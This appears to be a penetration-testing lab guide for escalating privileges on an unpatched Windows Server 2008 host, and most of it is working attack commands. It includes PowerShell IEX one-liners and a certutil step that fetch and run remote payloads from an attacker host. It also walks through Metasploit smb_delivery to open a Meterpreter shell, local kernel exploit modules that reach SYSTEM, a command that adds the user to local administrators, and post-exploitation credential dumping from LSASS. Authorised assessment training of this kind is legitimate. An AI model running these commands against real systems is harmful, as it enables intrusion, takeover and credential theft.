## Windows Server 2008 - Legacy OS Assessment

Server 2008/2008 R2 reached end of life in January 2020, and extended support under Microsoft ESU expired January 2026, meaning these hosts are now completely unpatched.  They are still regularly encountered during internal assessments against hospitals, universities, and local government. 

***

## Server 2008 vs Modern Windows - Security Feature Gaps

| Feature | Server 2008 R2 | 2012 R2 | 2016 | 2019 |
|---|---|---|---|---|
| Windows Defender ATP | No | No | No | Yes |
| Credential Guard | No | No | Yes | Yes |
| Remote Credential Guard | No | No | Yes | Yes |
| Device Guard | No | No | Yes | Yes |
| Control Flow Guard | No | No | Yes | Yes |
| AppLocker | No | Yes | Yes | Yes |
| Just Enough Administration | No | Partial | Yes | Yes |

The absence of Credential Guard means LSASS credentials can be dumped directly with Mimikatz. The absence of Control Flow Guard means kernel exploits have fewer mitigations to bypass. 

***

## Step 1: Patch Level Enumeration

```cmd
:: Check installed hotfixes - tells you exactly what is patched
wmic qfe list full | findstr KB
wmic qfe get Caption,Description,HotFixID,InstalledOn | sort /+51

:: systeminfo - most useful for feeding into Windows-Exploit-Suggester
systeminfo > sysinfo.txt
systeminfo | findstr /i "OS Name\|OS Version\|System Type\|Hotfix"
```

```bash
# Feed systeminfo output to Windows-Exploit-Suggester on attack machine
git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester
pip2 install xlrd==1.2.0
python2 windows-exploit-suggester.py --update   # download latest vuln DB
python2 windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo sysinfo.txt

# Output tags exploits with [E] = exploit available in Metasploit, [M] = manual
# Focus on [E] entries first - fastest path to SYSTEM
```

```powershell
# Run Sherlock directly on target (no file write needed)
Set-ExecutionPolicy Bypass -Scope Process -Force
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/Sherlock.ps1')
Find-AllVulns

# Key outputs to look for:
# VulnStatus : Appears Vulnerable  <- actionable
# VulnStatus : Not Vulnerable      <- skip
# VulnStatus : Not supported on 64-bit  <- skip if x64
```

***

## Step 2: Initial Meterpreter Shell (SMB Delivery)

```
# Metasploit smb_delivery - serves payload via SMB, target executes with rundll32
# No file upload needed - runs entirely from SMB share in memory

msf6 > use exploit/windows/smb/smb_delivery
msf6 > set SRVHOST 10.10.14.3
msf6 > set LHOST 10.10.14.3
msf6 > set LPORT 4444
msf6 > set target 0        # 0 = DLL (better than PSH for older systems)
msf6 > exploit -j

# Note the command output:
# Run the following command on the target machine:
# rundll32.exe \\10.10.14.3\<share>\test.dll,0

# Execute on target (paste into cmd.exe):
rundll32.exe \\10.10.14.3\lEUZam\test.dll,0

# Alternative: certutil download + exec if SMB is filtered
certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.exe shell.exe
shell.exe
```

***

## Step 3: Process Architecture Migration

Many initial Meterpreter sessions on Server 2008 land in a 32-bit process because the delivery method (rundll32 via SysWOW64) is x86. Kernel exploits require matching architecture: 

```
meterpreter > getpid
meterpreter > ps

# Look for x64 processes owned by your user:
# taskhost.exe    x64   WINLPE-2K8\htb-student
# explorer.exe    x64   WINLPE-2K8\htb-student
# conhost.exe     x64   WINLPE-2K8\htb-student
# powershell.exe  x64   WINLPE-2K8\htb-student

meterpreter > migrate 2796    # migrate to a 64-bit process PID
# [*] Migration completed successfully

meterpreter > getpid
meterpreter > sysinfo         # Meterpreter should now show x64/windows

meterpreter > background
```

***

## Step 4: Local Privilege Escalation Modules for Server 2008

### MS10-092 - Task Scheduler XML CRC Bypass

The Task Scheduler validates `.xml` task files using only CRC32. A user can modify their own task file and create a CRC32 collision to run arbitrary commands as SYSTEM. Used by Stuxnet. 

```
msf6 > search ms10_092
msf6 > use exploit/windows/local/ms10_092_schelevator

msf6 > set SESSION 1
msf6 > set LHOST 10.10.14.3
msf6 > set LPORT 4443
msf6 > show options
# Target: Windows Vista, 7, and 2008 (auto selected)

msf6 > exploit

# Output sequence:
# [*] Preparing payload at C:\Windows\TEMP\<random>.exe
# [*] Creating task: <random_name>
# [*] SUCCESS: scheduled task created
# [*] Reading task XML, modifying CRC32, writing back
# [*] Disabling then re-enabling to trigger execution
# [*] Meterpreter session 2 opened as NT AUTHORITY\SYSTEM
```

### MS16-032 - Secondary Logon Handle Race Condition

Race condition in the Secondary Logon service. Works on Vista through Server 2012 R2 and Windows 10 (pre-1511). Requires at least 2 CPU cores. 

```
msf6 > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
msf6 > set SESSION 1
msf6 > set LHOST 10.10.14.3
msf6 > set LPORT 4445
msf6 > exploit

# PowerShell standalone version (no Metasploit):
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/Invoke-MS16032.ps1')
Invoke-MS16032 -Command "net localgroup administrators htb-student /add"
```

### MS15-051 - Win32k Client Copy Image

```
msf6 > use exploit/windows/local/ms15_051_client_copy_image
msf6 > set SESSION 1
msf6 > set LHOST 10.10.14.3
msf6 > set LPORT 4446
msf6 > exploit
# Tested on Vista, 7, Server 2008 x86 and x64
```

### MS11-046 - AFD.sys (Very Common on Unpatched Server 2008 R2 x64)

```
msf6 > use exploit/windows/local/ms11_046_afd_privilege_escalation
msf6 > set SESSION 1
msf6 > exploit

# Standalone binary (if Metasploit unavailable):
# Compile from: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS11-046
# Upload and execute: .\ms11-046.exe
```

***

## Complete Server 2008 Assessment Workflow

```
Land on Server 2008 as low-privilege user
         |
         v
1. systeminfo > sysinfo.txt
   wmic qfe get HotFixID,InstalledOn
         |
         v
2. Run Windows-Exploit-Suggester offline (attack machine)
   python2 windows-exploit-suggester.py --database mssb.xls --systeminfo sysinfo.txt
   AND
   Run Sherlock on target (IEX from HTTP server)
         |
         v
3. Note "Appears Vulnerable" results, cross-check with Metasploit
   Common Server 2008 hits:
   MS10-092 -> ms10_092_schelevator (Task Scheduler)
   MS11-046 -> ms11_046_afd_privilege_escalation
   MS15-051 -> ms15_051_client_copy_image
   MS16-032 -> ms16_032_secondary_logon_handle_privesc
         |
         v
4. Get Meterpreter session via smb_delivery
   rundll32.exe \\<attacker>\<share>\test.dll,0
         |
         v
5. Check architecture: ps -> find x64 process -> migrate
         |
         v
6. Run local_exploit_suggester post module to confirm
   use post/multi/recon/local_exploit_suggester
   set SESSION 1
   run
         |
         v
7. Try suggested modules in order, starting with highest confidence
         |
         v
8. Confirm SYSTEM: getuid -> NT AUTHORITY\SYSTEM
   Post-exploit: hashdump, kerberoast, dump lsass
         |
         v
9. Document for report:
   - Missing patch (KB number)
   - CVE / MS bulletin
   - Impact: SYSTEM access without admin credentials
   - Recommendation: Apply patch KB<number> or upgrade to Server 2019/2022
   - Mitigating control: network segmentation if upgrade not immediately possible
```
